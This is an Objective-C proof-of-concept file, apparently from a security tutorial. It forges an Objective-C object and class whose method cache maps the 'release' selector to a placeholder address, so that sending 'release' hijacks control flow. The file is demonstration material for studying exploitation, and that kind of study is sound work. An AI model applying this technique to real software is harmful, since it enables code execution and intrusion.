#import "Talker.h"
#include <dlfcn.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>

struct fake_structure_t
{
    uint64_t fake_objc_class_ptr;
}fake_structure;

struct fake_objc_class_t {
        char pad[0x10];
        void* cache_buckets_ptr;
        uint32_t cache_bucket_mask;
} fake_objc_class;

struct fake_cache_bucket_t {
        void* cached_sel;
        void* cached_function;
} fake_cache_bucket;

int main(void) {
    
  Talker *talker = [[Talker alloc] init];
  [talker say: @"Hello, Ice and Fire!"];
  [talker say: @"Hello, Ice and Fire!"];
  [talker release];

  fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
  NSLog(@"cached_sel = %p", NSSelectorFromString(@"release"));

  fake_cache_bucket.cached_function = (void*)0x41414141414141;
  NSLog(@"fake_cache_bucket.cached_function = %p", (void*)fake_cache_bucket.cached_function);
    
  fake_objc_class.cache_buckets_ptr = &fake_cache_bucket;
  fake_objc_class.cache_bucket_mask=0;

  fake_structure.fake_objc_class_ptr=&fake_objc_class;
  talker= &fake_structure;

  [talker release];
}

